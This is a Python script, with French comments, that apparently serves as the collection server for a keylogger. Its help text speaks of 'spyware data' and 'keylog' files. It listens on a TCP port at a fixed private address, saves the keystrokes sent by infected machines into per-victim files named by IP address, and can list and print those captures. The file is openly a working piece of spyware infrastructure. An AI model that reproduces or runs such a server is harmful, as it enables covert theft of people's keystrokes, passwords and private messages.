import socket
import datetime
import argparse
import time
import sys
import os
from pathlib import Path

# Arguments 

parser = argparse.ArgumentParser()
parser.add_argument("-l", "--listen", type=int, help="listens on the TCP port entered by the user and waits for the spyware data.")
parser.add_argument("-s", "--show", help="displays the list of files received by the program.", action="store_true")
parser.add_argument("-r", "--readfile", type=str, help="displays the content of a keylog file.")
parser.add_argument("-k", "--kill", help="stop all the instances of the server and stop all the clients.", action="store_true")
args = parser.parse_args()

# # Vérification du nombre d'arguments
# if len(sys.argv) > 2:
#     print("trop d'arguments")
#     exit(1)

# elif len(sys.argv) < 2:
#     print("pas assez d'arguments")
#     exit(1)

#Variables

cwd = Path.cwd()
path_captures = cwd / "captures"

# Fonctions

def handle_client(conn, addr):
    print(f"Connection from {addr}")

    try:
        # Réception des données
        data = conn.recv(1024).decode('utf-8')

        
        fic = list(path_captures.glob(f"{addr[0]}*.txt"))
        filename = path_captures / f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
        
        if fic == []:
            with open(filename, 'w') as file:
                file.write(data)
        else:
            ficfilename = fic[0]
            with open(ficfilename, 'a') as file:
                file.write("\n New data :\n")
                file.write(data)
            os.rename(ficfilename,filename)

        print(f"Data received and saved in {filename}")
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        conn.close()


def display_files():
    files = os.listdir(path_captures)
    print("List of files captured :")
    for file in files:
        print(" - " + file)
    
    if files == []:
        print("No files captured yet")


def read_file(filename):

    try :
        with open ("captures/" + filename, "r") as file:
            print("File content :")
            content = file.read()
            print(content)
    except FileNotFoundError:
        print(f"File '{filename}' not found in the 'captures' folder.")
        display_files()

# Traitement

if args.listen:
    # Configuration du socket
    host = '172.16.120.1'
    port = args.listen

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen()

    print(f"Server listening on {host}:{port}")


    running = True

    while running:

        conn, addr = server_socket.accept()
        handle_client(conn, addr)

elif args.show:
    display_files()
    sys.exit()


elif args.readfile:
    read_file(args.readfile)
    sys.exit()

elif args.kill:
    print("kill all the instances")



host = '172.16.120.1'  # localhost
port = 12345  # port 

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((host, port))
server_socket.listen()

print(f"Server listening on {host}:{port}")


running = True

while running:

    conn, addr = server_socket.accept()
    handle_client(conn, addr)


